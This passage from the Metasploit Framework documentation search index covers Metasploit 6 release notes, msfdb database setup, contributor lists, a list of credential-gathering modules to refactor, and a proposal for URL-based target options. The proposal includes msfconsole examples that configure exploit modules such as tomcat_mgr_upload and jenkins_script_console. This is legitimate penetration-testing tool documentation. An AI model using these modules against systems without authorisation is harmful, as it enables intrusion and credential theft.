unsupported versions. This results in a message saying that the session was closed. ",
    "url": "/docs/development/roadmap/metasploit-6-release-notes.html#payload-improvements",
    "relUrl": "/docs/development/roadmap/metasploit-6-release-notes.html#payload-improvements"
  },"403": {
    "doc": "Metasploit Framework 6.0 Release Notes",
    "title": "SMB 3",
    "content": "Metasploit 6 adds support for SMB client connections using the version 3 dialects. This adds compatibility for a large pool of modules to work in environments where SMB version 1 and 2 have been disabled. Additionally, one of the most notable improvements of the version 3 dialects is encryption support, which when negotiated allows the framework to secure it’s connections to compatible SMB servers. SMB version 3, which was added in Windows 8 and Server 2012 incorporates a few security improvements leading to many organizations migrating towards its exclusive use within their environments. While many modules were updated to use the RubySMB SMB 3 implementation, not all were updated. Notably many older exploits that pre-date the release of SMB 3 were not updated and continue to use the original Rex implementation of the protocol. For those modules that have been updated however, users will be able to use them without any changes to their work flow. By default the newest dialect will be negotiated with the remote server and if it is one of the dialects within version 3 that supports encryption, the framework will use encryption by default. Users can alter this behavior by setting the SMB::AlwaysEncrypt and SMB::ProtocolVersion options. SMB::AlwaysEncrypt enforces encryption for SMB 3 connections even when the server does not require it (defaults to: true) while SMB::ProtocolVersion is a comma separated list of versions to allow the framework to negotiate (default: 1,2,3). Module authors looking to write SMB modules should note the move towards the RubySMB protocol stack instead of the legacy Rex implementation. Much of the functionality is standardized within the mixins however some edge-case functionality must still be ported over to RubySMB. For information on writing modules target SMB for Metasploit, see Guidelines for Writing Modules with SMB. ",
    "url": "/docs/development/roadmap/metasploit-6-release-notes.html#smb-3",
    "relUrl": "/docs/development/roadmap/metasploit-6-release-notes.html#smb-3"
  },"404": {
    "doc": "Metasploit Framework 6.0 Release Notes",
    "title": "Pull Requests",
    "content": "A complete list of pull requests included as part of the initial version 6 work: . | Payload Improvements . | Add AES TLV encryption support: Java, Python . | Support AES-128-CBC as an additional option: Framework Core, Java | Change from PEM to DER for crypt TLV negotiation: Windows, Java, PHP, Framework Core, mettle, Python | . | Remove DLL exports from Meterpreter: Windows Framework Core, ReflectiveDLLInjection | Replace METHOD string with COMMAND_ID integer (to remove obvious strings): Framework Core, Windows, Java, PHP, Python | Cross-compile Windows binaries on Linux . | Various changes required for cross compilation | Update readme for cross compilation | . | Remove the old Mimikatz extension: Windows, Framework Core | Polymorphic x86/x64 Block API | . | Add SMBv3 support: ruby_smb, Framework Core . | Fixes and improvements from MSF code review | Store server system and start time values | . | Add a command target to the PSexec module | . ",
    "url": "/docs/development/roadmap/metasploit-6-release-notes.html#pull-requests",
    "relUrl": "/docs/development/roadmap/metasploit-6-release-notes.html#pull-requests"
  },"405": {
    "doc": "Metasploit Framework 6.0 Release Notes",
    "title": "Get Metasploit 6.0",
    "content": "You can get Metasploit 6.0 by checking out the 6.0.0 tag in the Metasploit GitHub project. Need a primer on Framework architecture and usage? Take a look at our wiki here, and feel free to reach out to the broader community on Slack. There are also myriad public and user-generated resources on Metasploit tips, tricks, and content, so if you can’t find something you want in our wiki, ask Google or the community what they recommend. See all the ways to stay informed and get involved at https://metasploit.com. ",
    "url": "/docs/development/roadmap/metasploit-6-release-notes.html#get-metasploit-60",
    "relUrl": "/docs/development/roadmap/metasploit-6-release-notes.html#get-metasploit-60"
  },"406": {
    "doc": "Metasploit Framework 6.0 Release Notes",
    "title": "Metasploit Framework 6.0 Release Notes",
    "content": "Metasploit Framework 6.0 is in progress! . Metasploit 6.0 adds a number of features and promotes a theme of being “secure by default”. See the release initial announcement here. ",
    "url": "/docs/development/roadmap/metasploit-6-release-notes.html",
    "relUrl": "/docs/development/roadmap/metasploit-6-release-notes.html"
  },"407": {
    "doc": "Metasploit Breaking Changes",
    "title": "Metasploit Breaking Changes",
    "content": "Occasionally, we have ideas or submissions that are absolutely awesome, but that require us to completely change how Metasploit does something, so the deployment of the feature must be done carefully. In Metasploit 6, it was the way we enumerated commands to the Meterpreter payloads and how we implemented crypto (as in cryptography) between framework and payloads. In an effort to chart these breaking changes, there is a github label for “Breaking Change” and we can use this space to talk about them as well. ",
    "url": "/docs/development/roadmap/metasploit-breaking-changes.html",
    "relUrl": "/docs/development/roadmap/metasploit-breaking-changes.html"
  },"408": {
    "doc": "Metasploit Data Service",
    "title": "Rationale",
    "content": "The current data storage mechanism couples the metasploit core framework code to the current data storage technology. Coupling causes inflexibility which are reflected via the following problems: . | Changes to the current data model are complex | The ability to support/use different data storage technologies is difficult | Promotes a monolithic architecture where poor performance in any segment of the software affects the entire system (large network scans) | . Our solution to this is a data service proxy. A data service proxy allows us to separate core metasploit framework code from the underlying data service technology. The framework.db reference to data services is no longer tied directly to the underlying data storage, but instead all calls are proxied to an underlying implementation. Currently we plan to support the legacy data storage technology stack (RAILS/PostgreSQL) which we hope to eventually phase out. The new implementation will use a RESTful (https://en.wikipedia.org/wiki/Representational_state_transfer) approach whereby calls to framework.db can be proxied to a remote web service that supports the same data service API. We have built a web service that runs atop the current data storage service for the community. This approach enables us to: . | More easily enhance the metasploit data model | Run a web-based data service independent of the metasploit framework . | Reduces the memory used by a metasploit framework instance using a data service by no longer requiring a DB client | Increases throughput as storage calls don’t necessarily need to be asynchronous | Allow teams to collaborate easily by connecting to a centralized data service | . | Quickly build out data services that leverage different technology stacks | Isolate component testing | Users of metasploit can now leverage a rigid API to build other tools easily (documentation to be provided soon) | . ",
    "url": "/docs/development/roadmap/metasploit-data-service-enhancements-goliath.html#rationale",
    "relUrl": "/docs/development/roadmap/metasploit-data-service-enhancements-goliath.html#rationale"
  },"409": {
    "doc": "Metasploit Data Service",
    "title": "Usage",
    "content": "For more information on setting up the web service and using the data services see Metasploit Web Service. ",
    "url": "/docs/development/roadmap/metasploit-data-service-enhancements-goliath.html#usage",
    "relUrl": "/docs/development/roadmap/metasploit-data-service-enhancements-goliath.html#usage"
  },"410": {
    "doc": "Metasploit Data Service",
    "title": "Metasploit Data Service",
    "content": "Project Goliath came about primarilly around the need to enhance the current data service and data models to increase the value of data in metasploit to our end users. This work is currently being done in 2 stages: . Stage 1 . This is currently a work in progress (which is why Goliath is currently not fully functional). The work being done or already done include: . | Port of the current data models to be used over HTTP / HTTPS | Creation of a web service that serves the metasploit data model | Creation of a new command in metasploit to remote (web based) data services | Creation of a Metasploit Data Service API V1 document | . Stage 2 . | Enhance the current data model | Creation of a Metasploit Data Service API V2 document Potential Changes include (feel free to submit ideas): . | Creation of a generic data type (for when you can’t figure out which data type data belongs) | . | . ",
    "url": "/docs/development/roadmap/metasploit-data-service-enhancements-goliath.html",
    "relUrl": "/docs/development/roadmap/metasploit-data-service-enhancements-goliath.html"
  },"411": {
    "doc": "Database Support",
    "title": "What is msfdb?",
    "content": "msfdb is a script included with all installations of Metasploit that allows you to easily setup and control both a database and a Web Service capable of connecting this database with Metasploit. While msfdb is the simplest method for setting up a database, you can also set one up manually. Instructions on manual setup can be found here. ",
    "url": "/docs/using-metasploit/intermediate/metasploit-database-support.html#what-is-msfdb",
    "relUrl": "/docs/using-metasploit/intermediate/metasploit-database-support.html#what-is-msfdb"
  },"412": {
    "doc": "Database Support",
    "title": "Why should I use msfdb?",
    "content": "It’s not mandatory to use a database with Metasploit, it can run perfectly fine without one. However, a lot of the features that makes Metasploit so great require a database, and msfdb is the simplest way to setup a Metasploit compatible database. The Metasploit features that require a connected database include: . | Recording other machines on a network that are found with a nmap scan via the db_nmap command are stored as “Hosts”. | Hosts can be viewed with the hosts command | . | Storing credentials successfully extracted by exploits are stored as “creds”. | Credentials are viewed with the creds command. | . | Keeping track of successful exploitation attempts are recorded as “Vulnerabilities”. | Successful exploitations can be viewed with the vulns command. | The vulns command also tracks unsuccessful exploitation attempts | . | Storing services detected on remote hosts by db_nmap are recorded as “Services” . | Remote services are viewed with the services command | . | Tracking multiple remote sessions opened by exploit payloads . | These sessions can be managed and tracked with the sessions command. | . | Storing any difficult to define information returned by successful exploits as “Loot” . | Viewable with the loot command | . | Keeping track of “Ping back payloads”, a non-interactive payload type that provides users with confirmation of remote execution on a target | Pivot through a network with “Routes” comprised of active sessions . | Viewable with the routes command | . | Building reports comprising all of the above information (Restricted to Pro users) | . All of the above features can also be logically separated within workspaces. By using the workspace command, you can place the results of certain operations in different workspaces. This helps keep any data generated or recorded during your use of Metasploit organized and easy to follow. ",
    "url": "/docs/using-metasploit/intermediate/metasploit-database-support.html#why-should-i-use-msfdb",
    "relUrl": "/docs/using-metasploit/intermediate/metasploit-database-support.html#why-should-i-use-msfdb"
  },"413": {
    "doc": "Database Support",
    "title": "Using msfdb",
    "content": "Using msfdb is simple. If you are starting the database for the first time navigate to the folder Metasploit is saved to, and run ./msfdb init. Creating database at /Users/your_current_account_name/.msf4/db Starting database at /Users/your_current_account_name/.msf4/db...success Creating database users Writing client authentication configuration file /Users/your_current_account_name/.msf4/db/pg_hba.conf Starting database at /Users/your_current_account_name/.msf4/db...success Creating initial database schema . This looks like a lot of information, but all it’s saying is that it’s creating the database Metasploit will use to store information. msfdb then needs to establish the credentials that are used in the Web Service. The Web Service is how Metasploit connects to the database we have just created. The first prompt asks you what username you want to use to connect to the database. [?] Initial MSF web service account username? [your_current_account_name]: . Then the password used to authenticate to the Web Service: . [?] Initial MSF web service account password? (Leave blank for random password): . Hitting enter for both these prompts will setup up the Web Service correctly. You can change these defaults and use a specific username and password if you want, but it’s not necessary. After these two prompts are dealt with, your Web Service will start! . Generating SSL key and certificate for MSF web service Attempting to start MSF web service...success MSF web service started and online Creating MSF web service user your_current_account_name ############################################################ ## MSF Web Service Credentials ## ## ## ## Please store these credentials securely. ## ## You will need them to connect to the webservice. ## ############################################################ MSF web service username: your_current_account_name MSF web service password: super_secret_password MSF web service user API token: super_secret_api_token MSF web service configuration complete The web service has been configured as your default data service in msfconsole with the name \"local-https-data-service\" If needed, manually reconnect to the data service in msfconsole using the command: db_connect --token super_secret_api_token --cert /Users/your_current_account_name/.msf4/msf-ws-cert.pem --skip-verify https://localhost:5443 The username and password are credentials for the API account: https://localhost:5443/api/v1/auth/account . Again, this is a lot of information to process, but it’s not nearly as complicated as it looks. The Username, Password, and API token used to connect to the Web Service is displayed: . MSF web service username: your_current_account_name MSF web service password: super_secret_password MSF web service user API token: super_secret_api_token . Followed by instructions on how to connect to your database with Metasploit via the Web Service: . If needed, manually reconnect to the data service in msfconsole using the command: db_connect --token super_secret_api_token --cert /Users/your_current_account_name/.msf4/msf-ws-cert.pem --skip-verify https://localhost:5443 . And the URL you can visit with your browser in order to connect to the Web Service This is useful for checking if the Web Service is running: . The username and password are credentials for the API account: https://localhost:5443/api/v1/auth/account . All this information is loaded by Metasploit automatically at startup from the ~/.msf4 folder. You should copy the credentials to a file in case you need them in the future. If you forget or lose the credentials but you can always run ./msfdb reinit and reset the Web Service authentication details. Just make sure to say no to the prompt asking you if you want to delete the Database contents! . ",
    "url": "/docs/using-metasploit/intermediate/metasploit-database-support.html#using-msfdb",
    "relUrl": "/docs/using-metasploit/intermediate/metasploit-database-support.html#using-msfdb"
  },"414": {
    "doc": "Database Support",
    "title": "msfdb commands",
    "content": "The commands for msfdb are as follows: . | ./msfdb init Creates and begins execution of a database &amp; web service. Additional prompts displayed after this command is executed allows optional configuration of both the username and the password used to connect to the database via the web service. Web service usernames and passwords can be set to a default value, or a value of the users choice. | ./msfdb delete Deletes the web service and database configuration files. You will also be prompted to delete the database’s contents, but this is not mandatory. | ./msfdb reinit The same as running ./msfdb delete followed immediately by ./msfdb init. | ./msfdb status Displays if the database &amp; web service are currently active. If the database is active it displays the path to its location. If the web service is active, the Process ID it has been assigned will be displayed. | ./msfdb start Start the database &amp; web service. | ./msfdb stop Stop the database &amp; web service. | ./msfdb restart The same as running ./msfdb stop followed immediately by ./msfdb start. | . ",
    "url": "/docs/using-metasploit/intermediate/metasploit-database-support.html#msfdb-commands",
    "relUrl": "/docs/using-metasploit/intermediate/metasploit-database-support.html#msfdb-commands"
  },"415": {
    "doc": "Database Support",
    "title": "msfdb errors",
    "content": "In the case of any of the above commands printing either a stack trace or error, your first step should be to run ./msfdb reinit (again making sure to say no to the prompt asking you if you want to delete the Database contents) and reattempt the command that caused the error. If the error persists, copy the command you executed, the output generated, and paste it into an error ticket. ",
    "url": "/docs/using-metasploit/intermediate/metasploit-database-support.html#msfdb-errors",
    "relUrl": "/docs/using-metasploit/intermediate/metasploit-database-support.html#msfdb-errors"
  },"416": {
    "doc": "Database Support",
    "title": "What’s next?",
    "content": "That’s it for the simple high level explanation of how to setup a database for metasploit. If that wasn’t enough detail for you you can check out our more in depth explanation here. If you want to get started hacking but don’t know how to, here are a few guides we really like: . | The easiest metasploit guide you’ll ever read - A great, easy to follow guide on how to set up Metasploit and Metasploitable (Our intentionally vulnerable Linux virtual machine used to for security training) for VMs. Also has a fantastic guide on penetration testing Metasploitable 2, from information gathering right up to exploitation. | Offensive Security: Metasploit Unleashed - Still dealing with Metasploitable 2, this guide covers similar content as the The easiest metasploit guide you’ll ever read, but with much more detail. | . However, if you’re confident in your knowledge of Metasploit and just want to get stuck in, then get stuck in! Good luck, be nice and have fun. ",
    "url": "/docs/using-metasploit/intermediate/metasploit-database-support.html#whats-next",
    "relUrl": "/docs/using-metasploit/intermediate/metasploit-database-support.html#whats-next"
  },"417": {
    "doc": "Database Support",
    "title": "Database Support",
    "content": " ",
    "url": "/docs/using-metasploit/intermediate/metasploit-database-support.html",
    "relUrl": "/docs/using-metasploit/intermediate/metasploit-database-support.html"
  },"418": {
    "doc": "Metasploit Framework Wish List",
    "title": "Always useful",
    "content": ". | If you’re unfamiliar with Metasploit or looking to tackle some smaller projects, we’ll thank you a million times over to look at our issue queue. Submitting bug fixes, testing reported issues, and answering questions are all extremely helpful. | See an issue whose submitter didn’t give us much information about replication, their target environment, or their version of Metasploit? See if you can get some clarity to help out, or better yet, test it yourself! | You can also sort out feature requests in our issue queue. See something that sounds cool? Fantastic! Tinker away and submit a PR. | Write docs! Adding documentation is one of the best ways to help current and future users (especially beginners) and save developers pain. | Check out PRs in the attic and see if you can pick up where another contributor left off or got stuck. | . ",
    "url": "/docs/development/roadmap/metasploit-framework-wish-list.html#always-useful",
    "relUrl": "/docs/development/roadmap/metasploit-framework-wish-list.html#always-useful"
  },"419": {
    "doc": "Metasploit Framework Wish List",
    "title": "A few other ideas",
    "content": ". | Implement transport switching for Mettle. | Improve network evasions across multiple protocols. Client headers abound with telltales! | Add UPnP recon and fuzzing library support (there’s a fun thread on this idea here) | . ",
    "url": "/docs/development/roadmap/metasploit-framework-wish-list.html#a-few-other-ideas",
    "relUrl": "/docs/development/roadmap/metasploit-framework-wish-list.html#a-few-other-ideas"
  },"420": {
    "doc": "Metasploit Framework Wish List",
    "title": "Metasploit Framework Wish List",
    "content": "We are frequently asked what would be useful as a contribution to the project. There’s evergreen advice below, as well as a few more specific wish list ideas from our team. ",
    "url": "/docs/development/roadmap/metasploit-framework-wish-list.html",
    "relUrl": "/docs/development/roadmap/metasploit-framework-wish-list.html"
  },"421": {
    "doc": "Metasploit Hackathons",
    "title": "Metasploit Hackathons",
    "content": "2016 . We hosted the first general Metasploit hackathon at the Rapid7 Austin Office Thursday 2016-09-15, starting at Noon (12pm) CST and going until 10am CST the following day. Got a cool Meterpreter extension you have wanted to try, module to write, or feature to add? We’ll be working both on new things and shepherding old-but-awesome things. Come join us on #metasploit on Freenode as well. 2017 . We hosted the second general Metasploit hackathon at the Rapid7 Austin Office and the Hyatt Place Arboretum, 2017-06-22 through 2017-06-25, including 15 developers. Combine a rotating cast of contributors, way too much food, a couple of guitars, and some incredibly outsized laptops, you end up with some great Metasploit hacking and fun. ",
    "url": "/docs/development/maintainers/metasploit-hackathons.html",
    "relUrl": "/docs/development/maintainers/metasploit-hackathons.html"
  },"422": {
    "doc": "Metasploit Loginpalooza",
    "title": "Modules to Refactor",
    "content": ". | auxiliary/gather/apache_rave_creds.rb | auxiliary/scanner/http/apache_userdir_enum.rb | auxiliary/voip/asterisk_login.rb | post/osx/gather/autologin_password.rb | auxiliary/scanner/http/axis_local_file_include.rb | exploits/windows/http/ca_arcserve_rpc_authbypass.rb | auxiliary/scanner/misc/cctv_dvr_login.rb | auxiliary/scanner/http/cisco_asa_asdm.rb | auxiliary/scanner/http/cisco_ironport_enum.rb | auxiliary/scanner/couchdb/couchdb_login.rb | auxiliary/gather/d20pass.rb | auxiliary/scanner/http/dell_idrac.rb | auxiliary/scanner/http/dlink_dir_300_615_http_login.rb | auxiliary/scanner/http/dlink_dir_615h_http_login.rb | auxiliary/scanner/http/dlink_dir_session_cgi_http_login.rb | auxiliary/scanner/http/dolibarr_login.rb | auxiliary/gather/doliwamp_traversal_creds.rb | auxiliary/server/capture/drda.rb | auxiliary/scanner/http/drupal_views_user_enum.rb | auxiliary/scanner/misc/dvr_config_disclosure.rb | auxiliary/gather/eaton_nsm_creds.rb | auxiliary/scanner/http/ektron_cms400net.rb | post/osx/gather/enum_osx.rb | post/windows/gather/enum_snmp.rb | post/windows/gather/enum_tomcat.rb | post/multi/gather/filezilla_client_cred.rb | exploits/multi/http/glassfish_deployer.rb | auxiliary/scanner/http/glassfish_login.rb | auxiliary/gather/hp_snac_domain_creds.rb | auxiliary/scanner/http/infovista_enum.rb | auxiliary/scanner/ipmi/ipmi_dumphashes.rb | auxiliary/scanner/oracle/isqlplus_login.rb | auxiliary/scanner/oracle/isqlplus_sidbrute.rb | exploits/linux/http/kloxo_sqli.rb | auxiliary/scanner/scada/koyo_login.rb | auxiliary/scanner/telnet/lantronix_telnet_password.rb | auxiliary/scanner/lotus/lotus_domino_hashes.rb | auxiliary/scanner/lotus/lotus_domino_login.rb | auxiliary/scanner/mongodb/mongodb_login.rb | post/linux/gather/mount_cifs_creds.rb | auxiliary/scanner/msf/msf_rpc_login.rb | auxiliary/scanner/msf/msf_web_login.rb | auxiliary/scanner/nessus/nessus_ntp_login.rb | auxiliary/scanner/nessus/nessus_xmlrpc_login.rb | auxiliary/scanner/nexpose/nexpose_api_login.rb | auxiliary/scanner/http/novell_mdm_creds.rb | auxiliary/scanner/misc/oki_scanner.rb | auxiliary/scanner/http/openmind_messageos_login.rb | auxiliary/scanner/openvas/openvas_gsad_login.rb | auxiliary/scanner/openvas/openvas_omp_login.rb | auxiliary/scanner/openvas/openvas_otp_login.rb | auxiliary/scanner/http/oracle_ilom_login.rb | post/windows/gather/credentials/outlook.rb | auxiliary/scanner/http/owa_login.rb | auxiliary/scanner/pcanywhere/pcanywhere_login.rb | post/multi/gather/pgpass_creds.rb | auxiliary/scanner/postgres/postgres_version.rb | post/linux/gather/pptpd_chap_secrets.rb | auxiliary/scanner/http/radware_appdirector_enum.rb | auxiliary/scanner/misc/raysharp_dvr_passwords.rb | post/windows/gather/credentials/razer_synapse.rb | post/windows/gather/credentials/razorsql.rb | auxiliary/scanner/rservices/rexec_login.rb | auxiliary/scanner/http/rfcode_reader_enum.rb | auxiliary/scanner/rservices/rlogin_login.rb | auxiliary/scanner/misc/rosewill_rxs3211_passwords.rb | auxiliary/scanner/rservices/rsh_login.rb | auxiliary/scanner/http/sap_businessobjects_user_brute.rb | auxiliary/scanner/http/sap_businessobjects_user_brute_web.rb | auxiliary/scanner/http/sap_businessobjects_user_enum.rb | auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb | auxiliary/scanner/sap/sap_mgmt_con_brute_login.rb | auxiliary/scanner/sap/sap_soap_bapi_user_create1.rb | auxiliary/scanner/sap/sap_soap_rfc_brute_login.rb | auxiliary/scanner/sap/sap_web_gui_brute_login.rb | auxiliary/scanner/http/sentry_cdu_enum.rb | auxiliary/scanner/http/sevone_enum.rb | auxiliary/scanner/oracle/sid_brute.rb | auxiliary/admin/oracle/sid_brute.rb | auxiliary/server/capture/sip.rb | post/windows/gather/credentials/smartermail.rb | post/windows/gather/credentials/spark_im.rb | auxiliary/scanner/http/splunk_web_login.rb | auxiliary/scanner/http/squiz_matrix_user_enum.rb | auxiliary/scanner/ssh/ssh_identify_pubkeys.rb | auxiliary/scanner/telnet/telnet_ruggedcom.rb | auxiliary/scanner/http/titan_ftp_admin_pwd.rb | auxiliary/scanner/http/tomcat_enum.rb | post/windows/gather/credentials/tortoisesvn.rb | post/windows/gather/credentials/total_commander.rb | auxiliary/scanner/http/typo3_bruteforce.rb | auxiliary/gather/vbulletin_vote_sqli.rb | exploits/unix/webapp/vbulletin_vote_sqli_exec.rb | auxiliary/scanner/http/vcms_login.rb | auxiliary/scanner/vmware/vmware_http_login.rb | auxiliary/scanner/dcerpc/windows_deployment_services.rb | auxiliary/scanner/http/wordpress_login_enum.rb | auxiliary/gather/wp_w3_total_cache_hash_extract.rb | . Special attention needed . | post/windows/gather/enum_domain.rb - Partials, should create realms but not full cores | post/windows/gather/enum_domain_group_users.rb - Should create realms and publics but won’t be able to get privates | post/windows/gather/enum_domains.rb - Creates realms | post/windows/gather/enum_logged_on_users.rb - Creates publics but not privates | . ",
    "url": "/docs/development/maintainers/metasploit-loginpalooza.html#modules-to-refactor",
    "relUrl": "/docs/development/maintainers/metasploit-loginpalooza.html#modules-to-refactor"
  },"423": {
    "doc": "Metasploit Loginpalooza",
    "title": "Metasploit Loginpalooza",
    "content": "The Loginpalooza contest is over! Congrats and thanks to @TomSellers, @ChrisTuncer, and @0a2940! . The list of modules to refactor is still here. Modules that get refactored should be removed from the list entirely. If you’d like to learn how to convert your favorite existing module, or write a new module, using the new LoginScanner mixin and the Credentials gem, please take a look at Creating Metasploit Framework LoginScanners. ",
    "url": "/docs/development/maintainers/metasploit-loginpalooza.html",
    "relUrl": "/docs/development/maintainers/metasploit-loginpalooza.html"
  },"424": {
    "doc": "Metasploit URL support proposal",
    "title": "Problems",
    "content": " ",
    "url": "/docs/development/propsals/metasploit-url-support-proposal.html#problems",
    "relUrl": "/docs/development/propsals/metasploit-url-support-proposal.html#problems"
  },"425": {
    "doc": "Metasploit URL support proposal",
    "title": "Multiple Options",
    "content": "Metasploit currently provides multiple options for configuring target details: . | RHOSTS | RPORT | VHOST | TARGETURI | SSL | USER | PASS | . Configuring this amount of options is cumbersome and time consuming on a per module basis. Although it is is possible to globally setting common values with the setg command - and to individually override the ports on a per module basis, it is still an arduous task: . setg RHOSTS x.x.x.x use module/foo set RPORT yyy run . Running module against unique targets . It is currently verbose when running modules against multiple targets, with independent ports and target paths. This must be done manually: . use module/foo set RHOST target1 set TARGETURI /jenkins run set RHOST target2 set TARGETURI /admin/jenkins run . ",
    "url": "/docs/development/propsals/metasploit-url-support-proposal.html#multiple-options",
    "relUrl": "/docs/development/propsals/metasploit-url-support-proposal.html#multiple-options"
  },"426": {
    "doc": "Metasploit URL support proposal",
    "title": "Approaches",
    "content": "So far there’s three main potential approaches to add URL support to msfconsole: . | Consolidating Options - Combining multiple options such as RHOST/RPORT/SSL/etc into one new option: TARGETS | Enriching RHOSTS with URL support - The RHOST’s option is modified to support URLs, and attempts to keep all options such as RHOST/PORT/SSL etc in sync. | Support setting a single RHOST_URL - Metasploit console will now support setting a single RHOST_URL value. Note that this wouldn’t show as an option to the user, but would be used as a ‘macro’ to populate the existing datastore values | . ",
    "url": "/docs/development/propsals/metasploit-url-support-proposal.html#approaches",
    "relUrl": "/docs/development/propsals/metasploit-url-support-proposal.html#approaches"
  },"427": {
    "doc": "Metasploit URL support proposal",
    "title": "1. Consolidating Options",
    "content": "Combining the module target options into one would help reduce the amount of steps required to configure a module: . set TARGETS https://user:password@target_app:4343 . When the user views the options for a given module, it will be consolidated. The user will no longer see options such as RPORT, SSL . Before . Multiple options are available for configuring the module options: . msf5 exploit(multi/http/tomcat_mgr_upload) &gt; options Module options (exploit/multi/http/tomcat_mgr_upload): Name Current Setting Required Description ---- --------------- -------- ----------- HttpPassword no The password for the specified username HttpUsername no The username to authenticate as Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;' RPORT 80 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections TARGETURI /manager yes The URI path of the manager app (/html/upload and /undeploy will be used) VHOST no HTTP server virtual host Exploit target: Id Name -- ---- 0 Java Universal . After . Multiple options are consolidated into a single TARGETS field: . msf5 exploit(multi/http/tomcat_mgr_upload) &gt; options Module options (exploit/multi/http/tomcat_mgr_upload): Name Current Setting Required Description ---- --------------- -------- ----------- Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOST_URLS yes The target host URL(s), or file with syntax 'file:&lt;path&gt;' Exploit target: Id Name -- ---- 0 Java Universal . Examples . It is now possible to run an individual module against different hosts, paths, and ports: . use exploit/multi/http/jenkins_script_console set TARGETS http://target1:9000/jenkins, http://target2:8080/admin/jenkins check . It is now possible to run an individual module against different hosts, paths, and ports: . use auxiliary/scanner/http/title set TARGETS https://google.com http://example.com run . It would still be possible to use IPv4/IPv6/CIDR syntax directly: . set TARGETS 192.168.1.5:139 . However - it is no longer clear how to use CIDR notation and set path information, other than making up a new syntax: . set TARGETS https://10.0.0.0/24:8080/some/app . Advantages . | As a user it’s now easy to configure one option | A single option is less overwhelming to the user when available module options | The user can directly copy/paste a URL from their browser into msfconsole to run a check module against | A module can now be run against multiple arbitrary targets with independent paths / ports | Helps to catch improperly set ports. For instance, setting the SSL option to true - but forgetting to update RPORT to 443 | Simple to implement with a known effort | . Disadvantages . | The option consolidation breaks the majority of existing module documentation | It’s no longer clear to use use CIDR notation and setting path information, other than making up a new syntax? | Breaks the user’s existing muscle memory for configuring modules | Hard to make a change to a single value, i.e. setting targets then wishing to modify the target URI or port uniformly | Lose the ability to easily set a single global RHOST value, and set the ports individually on a per module basics | We lose the ability to have sane defaults set for options, such as: . | TARGETURI = /manager | RPORT = 139 | . | The modules additionally lose the descriptive metadata for the significance of fields, such as TARGETURI: | . Module options (exploit/multi/http/jenkins_script_console): Name Current Setting Required Description ---- --------------- -------- ----------- ... TARGETURI /jenkins/ yes The path to the Jenkins-CI application ... ",
    "url": "/docs/development/propsals/metasploit-url-support-proposal.html#1-consolidating-options",
    "relUrl": "/docs/development/propsals/metasploit-url-support-proposal.html#1-consolidating-options"
  },"428": {
    "doc": "Metasploit URL support proposal",
    "title": "2. Enriching RHOSTS with URL support",
    "content": "The RHOSTS field is updated to support a URL formats: . set RHOSTS http://target1:9000/jenkins . Before / After . The multiple options are still available to the user, there is no change to this behavior: . set RHOSTS https://a.site.com/foo Module options (exploit/multi/http/tomcat_mgr_upload): Name Current Setting Required Description ---- --------------- -------- ----------- HttpPassword no The password for the specified username HttpUsername no The username to authenticate as Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS https://a.site.com/foo yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;' RPORT 443 yes The target port (TCP) SSL true no Negotiate SSL/TLS for outgoing connections TARGETURI /foo yes The URI path of the manager app (/html/upload and /undeploy will be used) VHOST a.site.com no HTTP server virtual host . Examples . The use of RHOSTS continues to be a valid option name: . set RHOSTS https://a.site.com/foo . The options are now individually updated with corresponding values: . set RHOSTS https://a.site.com/foo Module options (exploit/multi/http/tomcat_mgr_upload): Name Current Setting Required Description ---- --------------- -------- ----------- HttpPassword no The password for the specified username HttpUsername no The username to authenticate as Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS https://a.site.com/foo yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;' RPORT 443 yes The target port (TCP) SSL true no Negotiate SSL/TLS for outgoing connections TARGETURI /foo yes The URI path of the manager app (/html/upload and /undeploy will be used) VHOST a.site.com no HTTP server virtual host . If the user wishes to update an individual option, the rhost’s value will be recomputed: . set RHOSTS https://a.site.com/foo set TARGETURI /bar Module options (exploit/multi/http/tomcat_mgr_upload): Name Current Setting Required Description ---- --------------- -------- ----------- HttpPassword no The password for the specified username HttpUsername no The username to authenticate as Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS https://a.site.com/bar yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;' RPORT 443 yes The target port (TCP) SSL true no Negotiate SSL/TLS for outgoing connections TARGETURI /bar yes The URI path of the manager app (/html/upload and /undeploy will be used) VHOST a.site.com no HTTP server virtual host . The user can set multiple RHOSTS, with each option being comma delimited within the options table: . set RHOSTS https://a.site.com/foo http://b.site.com/bar Module options (exploit/multi/http/tomcat_mgr_upload): Name Current Setting Required Description ---- --------------- -------- ----------- HttpPassword no The password for the specified username HttpUsername no The username to authenticate as Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS https://a.site.com/bar, http://b.site.com/bar yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;' RPORT 443, 80 yes The target port (TCP) SSL true, false no Negotiate SSL/TLS for outgoing connections TARGETURI /foo, /bar yes The URI path of the manager app (/html/upload and /undeploy will be used) VHOST a.site.com, b.site.com no HTTP server virtual host . The user can continue to set override individual options uniformly: . set RHOSTS https://a.site.com/foo http://b.site.com/bar set TARGETURI /new Module options (exploit/multi/http/tomcat_mgr_upload): Name Current Setting Required Description ---- --------------- -------- ----------- HttpPassword no The password for the specified username HttpUsername no The username to authenticate as Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS https://a.site.com/new, http://b.site.com/new yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;' RPORT 443, 80 yes The target port (TCP) SSL true, false no Negotiate SSL/TLS for outgoing connections TARGETURI /new yes The URI path of the manager app (/html/upload and /undeploy will be used) VHOST a.site.com, b.site.com no HTTP server virtual host . The user can set new path values individually: . set RHOSTS https://a.site.com/foo http://b.site.com/bar set TARGETURI /abc /xyz Module options (exploit/multi/http/tomcat_mgr_upload): Name Current Setting Required Description ---- --------------- -------- ----------- HttpPassword no The password for the specified username HttpUsername no The username to authenticate as Proxies no A proxy chain of format 